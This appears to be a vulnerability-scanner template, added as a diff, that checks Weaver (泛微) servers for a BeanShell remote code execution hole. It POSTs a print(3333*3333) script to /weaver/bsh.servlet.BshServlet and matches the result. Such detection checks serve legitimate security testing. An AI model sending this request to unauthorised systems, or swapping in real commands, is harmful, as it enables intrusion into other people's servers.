@@ -1,0 +1,32 @@
+{
+    "Name": "泛微-javabeanshell-rce",
+    "Description": "泛微-javabeanshell-rce",
+    "Product": "泛微",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/weaver/bsh.servlet.BshServlet",
+        "Port":"",
+        "Data":"bsh.script=print%283333*3333%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw",
+        "follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+            "Check_Steps":"AND",
+            "Checks": [
+                    {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "11108889"
+                    },
+                     {
+                    "Operation": "code", 
+                    "Key":"",
+                    "Value": "200"  
+                     }
+            ]
+            },
+            "Next_decide":""
+        }
+    ]}
